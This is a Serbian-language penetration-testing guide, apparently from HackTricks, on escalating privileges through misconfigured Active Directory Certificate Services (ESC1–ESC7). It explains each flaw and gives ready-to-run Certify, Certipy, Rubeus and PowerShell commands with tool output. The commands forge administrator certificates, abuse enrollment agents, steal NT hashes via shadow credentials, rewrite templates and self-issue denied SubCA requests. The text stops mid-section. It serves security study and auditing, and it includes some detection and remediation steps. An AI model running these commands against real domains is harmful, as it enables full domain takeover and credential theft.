# Eskalacija domena AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz objava:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani šabloni sertifikata - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih šablona sertifikata - ESC1

- **Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Potpisi ovlašćenog osoblja nisu potrebni.**
- **Deskriptori bezbednosti šablona sertifikata previše su permisivni, pa korisnici sa niskim privilegijama mogu da dobiju prava za upis.**
- **Šabloni sertifikata konfigurisani su tako da definišu EKU-ove koji omogućavaju autentifikaciju:**
  - Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili nijedan EKU (SubCA).
- **Šablon dozvoljava podnosiocima zahteva da u zahtevu za potpisivanje sertifikata (CSR) navedu subjectAltName:**
  - Active Directory (AD) daje prednost vrednosti subjectAltName (SAN) u sertifikatu prilikom provere identiteta, ako je prisutna. To znači da navođenjem SAN-a u CSR-u može da se zatraži sertifikat za lažno predstavljanje bilo kog korisnika (npr. administratora domena). Da li podnosilac zahteva može da navede SAN određuje svojstvo `mspki-certificate-name-flag` AD objekta šablona sertifikata. Ovo svojstvo je bitmask, a prisustvo oznake `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` dozvoljava podnosiocu zahteva da navede SAN.

> [!CAUTION]
> Ova podešavanja ukazuju na potencijalno ranjiv ESC1 šablon, a ne na potpuno uspostavljen put za lažno predstavljanje. Proverite da li ciljni principal može da se upiše na CA koji objavljuje šablon, da li je upis na CA dozvoljen i da li izdat sertifikat ispunjava pravila za snažno SID mapiranje na krajnjoj tački za autentifikaciju. Trenutni, zakrpљeni KDC-ovi mogu da odbiju zatraženi UPN ako se SID sertifikata ne podudara sa ciljnim SID-om; pogledajte [Microsoft's certificate mapping guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Prava za upis dodeljena grupi **Domain Computers** mogu da omoguće pravo na upis identitetu računara koji je prethodno pripremljen, čak i kada prvobitni korisnik ne može da se upiše. Zasebno procenite prava principala računara. Pre slanja zahteva proverite `msPKI-Minimal-Key-Size`: šablon koji zahteva RSA ključeve od 4096 bita odbaciće podrazumevani ključ klijenta od 2048 bita. SID cilja naveden u zahtevu može da reši nepodudaranje SID-ova samo ako CA i KDC prihvate tako dobijeni sertifikat i njegovo mapiranje; ni oznake šablona ni ACE za Enroll same po sebi to ne dokazuju.

Ova funkcija je ponekad omogućena da bi se podržalo generisanje HTTPS ili host sertifikata u hodu pomoću proizvoda ili servisa za deployment, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, za razliku od slučaja kada se postojeći šablon sertifikata (kao što je šablon `WebServer`, u kom je omogućena oznaka `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplira, pa zatim izmeni tako da uključuje OID za autentifikaciju.<sup>[[6]](#references)</sup>

### Zloupotreba

Da biste **pronašli ranjive šablone sertifikata**, možete da pokrenete:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Da bi se **ova ranjivost zloupotrebila za predstavljanje kao administrator**, može se pokrenuti:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Zatim možete konvertovati generisani **certificate u `.pfx`** format i ponovo ga upotrebiti za **autentifikaciju pomoću Rubeus-a ili certipy-ja**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows binarne datoteke „Certreq.exe“ i „Certutil.exe“ mogu da se koriste za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumerisanje predložaka sertifikata u konfiguracionoj šemi AD šume, konkretno onih koji ne zahtevaju odobrenje ili potpise, imaju EKU za Client Authentication ili Smart Card Logon i imaju omogućen `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može da se obavi pokretanjem sledećeg LDAP upita:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Pogrešno konfigurisani predlošci sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje korisnicima sa niskim privilegijama prava za upis.
2. Zahtev za odobrenje rukovodioca je onemogućen.
3. Izostavljen je zahtev za ovlašćene potpise.
4. Previše permisivan bezbednosni deskriptor na predlošku sertifikata dodeljuje korisnicima sa niskim privilegijama prava za upis sertifikata.
5. **Predložak sertifikata je definisan tako da uključuje Any Purpose EKU ili da nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju svrhu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda itd. Za iskorišćavanje ovog scenarija može se primeniti ista **tehnika koja se koristi za ESC3**.

Sertifikati **bez EKU-ova**, koji funkcionišu kao sertifikati podređenog CA-a, mogu se iskoristiti za **bilo koju svrhu** i mogu se **koristiti i za potpisivanje novih sertifikata**. Zbog toga napadač može da navede proizvoljne EKU-ove ili polja u novim sertifikatima koristeći sertifikat podređenog CA-a.

Međutim, novokreirani sertifikati za **autentifikaciju domena** neće funkcionisati ako podređeni CA nije pouzdan za objekat **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi potencijalno mogli da budu **zloupotrebljeni** u razne svrhe (npr. za potpisivanje koda, autentifikaciju servera itd.) i mogli bi da imaju značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Da bi se pronašli predlošci koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Pogrešno konfigurisani šabloni Enrollment Agent-a - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita šablona** (zato ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principal-u da se **registruje** za **sertifikat** **u ime drugog korisnika**.

**„Enrollment agent“** se registruje na takvom **šablonu** i koristi dobijeni **sertifikat za supotpisivanje CSR-a u ime drugog korisnika**. Zatim **šalje** **supotpisani CSR** CA-u, registrujući se na **šablonu** koji **dozvoljava „enroll on behalf of“**, a CA odgovara **sertifikatom koji pripada „drugom“ korisniku**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za registraciju korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Nije potreban nijedan ovlašćeni potpis.
- Deskriptor bezbednosti šablona sertifikata je previše permisivan i dodeljuje prava za registraciju korisnicima sa niskim privilegijama.
- Šablon sertifikata sadrži Certificate Request Agent EKU, koji omogućava traženje sertifikata iz drugih šablona u ime drugih principal-a.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za registraciju korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Ciljni šablon verzije 1 može da prihvati enrollment agent-a bez novijih granularnih kontrola pravila izdavanja; za verziju 2 ili noviju, proverite zahteve za izdavanje application-policy i ovlašćene potpise umesto da isključite šablon samo na osnovu verzije.
- EKU definisan u šablonu sertifikata dozvoljava autentifikaciju na domenu.
- CA ne primenjuje ograničenja za enrollment agent-e.

Ciljni šablon takođe mora biti objavljen na izabranom CA-u, dozvoljavati ciljnom nalogu da se registruje i podržavati predviđenu upotrebu za autentifikaciju na domenu. Proverite obavezne atribute subject/SAN na tom nalogu; na primer, šablon koji formira subject email adresu iz AD-a ne može da izda sertifikat za nalog bez potrebne vrednosti `mail`. Sam agent sertifikat ne ispunjava ove uslove za ciljni šablon.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) da biste zloupotrebili ovaj scenario:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Korisnici kojima je dozvoljeno da **pribave** **sertifikat agenta za upis**, predlošci u kojima je agentima za upis dozvoljeno da upisuju i **nalozi** u čije ime agent za upis može da deluje mogu biti ograničeni pomoću enterprise CA-ova. To se postiže otvaranjem snap-in-a `certsrc.msc`, **klikom desnim tasterom miša na CA**, **klikom na Properties**, a zatim **prelaskom** na karticu „Enrollment Agents“.

Međutim, napominje se da je **podrazumevana** postavka za CA-ove „**Ne ograničavaj agente za upis**“. Kada administratori omoguće ograničavanje agenata za upis izborom opcije „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje veoma permisivna. Grupi **Everyone** omogućava pristup upisu u sve predloške kao bilo ko.

### PowerShell PoC skripte samo za Windows uz Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindeshell/Certi-Bhai) demonstrira ESC1 i ESC2/ESC3 bez Certify ili Certipy. Njegove skripte kreiraju izvozivi RSA ključ od 2048 bita pomoću COM API-ja `X509Enrollment`, sastavljaju PKCS#10 zahtev, putem LDAP-a pronalaze prvi `pKIEnrollmentService`, šalju zahtev preko `CertificateAuthority.Request`, instaliraju odgovor u `Cert:\CurrentUser\My` i izvoze PFX kodiran u Base64. ESC1 skripta dodaje SAN za UPN koji odabere napadač (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, vrednost `0xb`), dok ESC2/ESC3 skripte koriste prvi sertifikat za potpisivanje PKCS#7 zahteva u ime drugog.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Skripte ispisuju Base64 od **PFX**-a, koji uključuje privatni ključ, za direktnu upotrebu sa Rubeus-om. Nemojte da ga zamenite sa `[Convert]::ToBase64String($cert.RawData)`: `RawData` kodira samo javni sertifikat i ne može da potpiše PKINIT zahtev.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Ranljiv pristup kontroli šablona sertifikata - ESC4

### **Objašnjenje**

**Security descriptor** na **šablonima sertifikata** definiše **dozvole** koje određeni **AD principals** imaju nad šablonom.

Ako **napadač** ima potrebne **dozvole** da **izmeni** **šablon** i uvede bilo koje **iskoristive pogrešne konfiguracije** navedene u **prethodnim odeljcima**, može doći do eskalacije privilegija.

Važne dozvole koje se odnose na šablone sertifikata uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Daje implicitnu kontrolu nad objektom i omogućava izmenu bilo kog atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kog atributa.
- **WriteOwner:** Omogućava promenu vlasnika objekta u principal-a pod kontrolom napadača.
- **WriteDacl:** Omogućava izmenu kontrola pristupa, što potencijalno može napadaču dodeliti FullControl.
- **WriteProperty:** Omogućava uređivanje bilo kog svojstva objekta.

Proverite i DACL kontejnera `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Odgovarajući ACE `CreateChild` ograničen na klasu [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c), ili široko dodeljena puna kontrola, mogu omogućiti kreiranje novog objekta šablona. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) da ovaj kontejner sadrži te objekte šablona. Pre nego što zaključite da je kreiranje moguće, proverite odgovarajuće deny ACE-ove i nasleđivanje. Samo kreiranje šablona ne izdaje sertifikat: CA mora da ga objavi, principal koji podnosi zahtev mora imati enrollment pristup, a sertifikat mora biti mapiran na predviđeni identitet na krajnjoj tački za autentifikaciju.

### Zloupotreba

Da biste pronašli principals sa pravima za uređivanje šablona i drugih PKI objekata, izvršite enumeraciju pomoću Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Primer privesc-a sličnog prethodnom:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je slučaj kada korisnik ima privilegije za upis u predložak sertifikata. To se, na primer, može zloupotrebiti za izmenu konfiguracije predloška sertifikata tako da postane ranjiv na ESC1.

Predložak koji već omogućava podnosiocu zahteva da navede subject, ali ima samo Server Authentication upotrebu, sam po sebi nije predložak za prijavu korisnika. Ako ima efektivna prava kontrole nad predloškom, napadač bi mogao da izmeni njegove EKU-ove za autentifikaciju ili politike aplikacija pre nego što zatraži sertifikat; [Microsoft dokumentuje svrhu Smartcard Logon EKU-a za prijavljivanje](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Proverite da li CA objavljuje izmenjeni predložak, da li podnosilac zahteva može da se upiše, da li su ispunjeni zahtevi za odobrenje/potpis i da li se izdati sertifikat mapira na željeni nalog. Konkretno, [zakrpljeni kontroleri domena u režimu Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) odbacuju sertifikate bez snažnog mapiranja; dodavanje UPN-a ciljnog korisnika u zahtev ne zaobilazi taj uslov.

Kao što vidimo na gornjoj putanji, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` vezu sa `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog pregleda komande `shadow auto` programa Certipy, kojom se preuzima NT hash žrtve.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** može da prepiše konfiguraciju šablona sertifikata jednom komandom. **Podrazumevano**, Certipy će **prepisati** konfiguraciju tako da bude **ranjiva na ESC1**. Možemo i da navedemo parametar **`-save-old` kako bismo sačuvali staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Razgranata mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata više objekata osim predložaka sertifikata i certificate authority-ja, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD računarski objekat CA servera, koji se može kompromitovati mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji AD objekat potomak ili kontejner unutar konkretne putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, ali se ne ograničava na, kontejnere i objekte kao što su kontejner Certificate Templates, kontejner Certification Authorities, objekat NTAuthCertificates i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**objavi CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) dotiče se i posledica zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako ih je opisao Microsoft. Kada se aktivira na Certification Authority-ju (CA), ova konfiguracija dozvoljava uključivanje **vrednosti koje definiše korisnik** u **alternativno ime subjekta** za **bilo koji zahtev**, uključujući zahteve sastavljene iz Active Directory®-ja. Shodno tome, napadač može da se registruje pomoću **bilo kog predloška** podešenog za **autentikaciju** domena — posebno onih koji omogućavaju registraciju korisnicima bez privilegija, kao što je standardni User template. Tako napadač može da pribavi sertifikat koji mu omogućava da se autentifikuje kao administrator domena ili **bilo koji drugi aktivan entitet** u domenu.<sup>[[9]](#references)</sup>

**Napomena**: Pristup dodavanja **alternativnih imena** u Certificate Signing Request (CSR) pomoću argumenta `-attrib "SAN:"` u `certreq.exe` (koji se naziva „Name Value Pairs“) razlikuje se od strategije iskorišćavanja SAN-ova u ESC1. Razlika je u tome **kako se podaci o nalogu smeštaju** — u atribut sertifikata, a ne u ekstenziju.

### Zloupotreba

Da bi proverile da li je ova postavka aktivirana, organizacije mogu da koriste sledeću komandu sa `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ova operacija u suštini koristi **udaljeni pristup registru**, pa bi alternativni pristup mogao biti:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i da je iskoriste:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Da bi se ove postavke izmenile, pod pretpostavkom da posedujete **administratorska prava nad domenom** ili ekvivalentna prava, sledeća komanda može da se izvrši sa bilo koje radne stanice:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavica se može ukloniti pomoću:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022, novoišdata **certificates** sadržavaće **security extension** koji uključuje svojstvo **`objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odražava **`objectSid` podnosioca zahteva**, a ne SAN.\
> Da bi se ESC6 iskoristio, neophodno je da sistem bude podložan ESC10 (slaba mapiranja certificates), koja daje prednost **SAN-u u odnosu na novo security extension**.

## Kontrola pristupa ranjivom autoritetu za izdavanje certificates - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa autoritetu za izdavanje certificates ostvaruje se skupom dozvola koje regulišu radnje CA-a. Te dozvole možete pregledati tako što ćete otvoriti `certsrv.msc`, kliknuti desnim tasterom miša na CA, izabrati svojstva, a zatim otvoriti karticu Security. Dozvole se mogu nabrojati i pomoću modula PSPKI i komandi kao što su:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Ovo pruža uvid u osnovna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „administrator CA“ i „upravljač sertifikatima“.<sup>[[6]](#references)</sup>

#### Zloupotreba

Prava **`ManageCA`** nad sertifikacionim autoritetom omogućavaju principalu da daljinski menja podešavanja pomoću PSPKI-ja. To uključuje uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, čime se dozvoljava navođenje SAN-a u bilo kom šablonu — što je ključno za eskalaciju domena.

Ovaj postupak može da se pojednostavi pomoću cmdlet-a **Enable-PolicyModuleFlag** iz PSPKI-ja, koji omogućava izmene bez direktne interakcije sa GUI-jem.

Prava **`ManageCertificates`** omogućavaju odobravanje zahteva na čekanju, čime se zaobilazi zaštita „odobrenje upravljača CA sertifikatima“.

Kombinacija modula **Certify** i **PSPKI** može da se koristi za podnošenje zahteva za sertifikat, njegovo odobravanje i preuzimanje:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** korišćene su dozvole **`Manage CA`** da bi se **omogućila** zastavica **EDITF_ATTRIBUTESUBJECTALTNAME2** za izvođenje **ESC6 napada**, ali to neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa `Manage CA`, dozvoljeno mu je i da **restartuje servis**. Međutim, to **ne znači da korisnik može daljinski da restartuje servis**. Pored toga, E**SC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zato je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti pomoću **`ManageCA`**)
- Šablon sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti pomoću **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu da **izdaju odbijene zahteve za sertifikat**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali samo **administratori** mogu da se upišu na šablon. Dakle, **korisnik** može da **podnese zahtev** za upis na **`SubCA`** — koji će biti **odbijen** — a zatim ga **rukovodilac naknadno izda**.<sup>[[6]](#references)</sup>

#### Zloupotreba

Možete sebi da **dodelite pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog oficira.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Šablon **`SubCA`** može da se **omogući na CA** pomoću parametra `-enable-template`. Šablon `SubCA` je podrazumevano omogućen.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Ako smo ispunili preduslove za ovaj napad, možemo početi tako što ćemo **zatražiti sertifikat zasnovan na predlošku `SubCA`**.

**Ovaj zahtev će biti odbije**n, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Uz naše **`Manage CA` i `Manage Certificates`**, možemo zatim da **izdamo sertifikat na osnovu neuspešnog zahteva** pomoću komande `ca` i parametra `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

I konačno, možemo **preuzeti izdat sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanja EDITF atributa ili odobravanja zahteva na čekanju), **Certify 2.0** otkrio je potpuno novu primitivu koja zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metod `ICertAdmin::SetExtension` može da izvrši svaki principal koji ima *Manage Certificates*. Iako su legitimni CA-ovi tradicionalno koristili ovaj metod za ažuriranje ekstenzija u zahtevima **na čekanju**, napadač može da ga zloupotrebi da **doda *nepodrazumevanu ekstenziju sertifikata*** (na primer, prilagođeni OID *Certificate Issuance Policy*, kao što je `1.1.1.1`) zahtevu koji čeka na odobrenje.

Pošto ciljni template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA NEĆE zameniti vrednost koju je kontrolisao napadač kada zahtev bude izdat. Zato će dobijeni sertifikat sadržati ekstenziju koju je izabrao napadač, a ona može da:

* Ispuni zahteve za Application / Issuance Policy drugih ranjivih template-a (što dovodi do eskalacije privilegija).
* Ubaci dodatne EKU-ove ili politike koje sertifikatu daju neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – ranije smatran „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu eskalaciju privilegija ili dugoročnu postojanost, bez menjanja konfiguracije CA-a i bez potrebe za restriktivnijim pravom *Manage CA*.

#### Zloupotreba primitive pomoću Certify 2.0

1. **Pošaljite zahtev za sertifikat koji će ostati *na čekanju*.** To se može postići korišćenjem template-a koji zahteva odobrenje menadžera:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Dodajte prilagođeno proširenje zahtevu na čekanju** koristeći novu komandu `manage-ca`:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
